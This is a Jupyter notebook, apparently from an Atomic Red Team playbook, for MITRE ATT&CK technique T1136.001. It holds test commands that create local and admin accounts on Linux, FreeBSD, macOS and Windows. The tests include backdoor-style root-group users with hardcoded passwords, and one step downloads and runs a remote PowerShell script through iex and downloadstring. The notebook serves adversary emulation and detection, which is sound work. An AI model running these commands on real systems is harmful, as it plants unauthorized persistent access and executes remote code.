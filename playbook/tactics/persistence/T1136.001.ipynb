{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c680a442",
   "metadata": {},
   "source": "# T1136.001 - Local Account\nAdversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service Accounts Security)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system."
  },
  {
   "cell_type": "markdown",
   "id": "49bf909e",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "965087f6",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Create a user account on a Linux system",
    "Create a user via useradd\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nuseradd -M -N -r -s /bin/bash -c evil_account evil_user\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8c0e5c91",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "fc2687bf",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nuserdel evil_user\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b8c68c47",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ba0097b1",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Create a user account on a FreeBSD system",
    "Create a user via pw\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\npw useradd evil_user -s /usr/sbin/nologin -d /nonexistent -c evil_account\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d52ecd11",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "9a39017e",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrmuser -y evil_user\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "58ff060c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c3466be6",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Create a user account on a MacOS system",
    "Creates a user on a MacOS system with dscl\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ndscl . -create /Users/evil_user\ndscl . -create /Users/evil_user UserShell /bin/zsh\ndscl . -create /Users/evil_user RealName \"Evil Account\"\ndscl . -create /Users/evil_user UniqueID \"1010\"\ndscl . -create /Users/evil_user PrimaryGroupID 80\ndscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fe1b4c18",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "b058a2fa",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\ndscl . -delete /Users/evil_user\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "93278f87",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "fbcb7fb2",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Create a new user in a command prompt",
    "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user /add \"T1136.001_CMD\" \"T1136.001_CMD!\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4095a0b3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "00d18c66",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nnet user /del \"T1136.001_CMD\" >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5f438c09",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "70db637d",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Create a new user in PowerShell",
    "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-LocalUser -Name \"T1136.001_PowerShell\" -NoPassword\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "475b7a52",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "a367fb46",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-LocalUser -Name \"T1136.001_PowerShell\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ddaecc8d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3e77a666",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Create a new user in Linux with `root` UID and GID.",
    "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nuseradd -g 0 -M -d /root -s /bin/bash butter\nif [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"butter:BetterWithButter\" | sudo chpasswd; else echo \"BetterWithButter\" | passwd --stdin butter; fi;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2304feb6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "228d5fe3",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nuserdel butter\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd01005a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b3439fcc",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Create a new user in FreeBSD with `root` GID.",
    "Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\npw useradd butter -g 0 -d /root -s /bin/sh\necho \"BetterWithButter\" | pw usermod butter -h 0\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "003db534",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "ae23a59c",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\npw userdel butter\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f496d2d8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d878440a",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Create a new Windows admin user",
    "Creates a new admin user in a command prompt.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user /add \"T1136.001_Admin\" \"T1136_pass\"\nnet localgroup administrators \"T1136.001_Admin\" /add\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e9782507",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "43962586",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nnet user /del \"T1136.001_Admin\" >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "714bf5c0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "37a1870c",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Create a new Windows admin user via .NET",
    "Creates a new admin user in a powershell session without using net.exe\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9145c4e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1136.001 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "5130d34c",
   "metadata": {},
   "source": "## Detection\nMonitor for processes and command-line parameters associated with local account creation, such as <code>net user /add</code> , <code>useradd</code> , and <code>dscl -create</code> . Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. (Citation: Microsoft User Creation Event) Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary. For network infrastructure devices, collect AAA logging to monitor for account creations."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}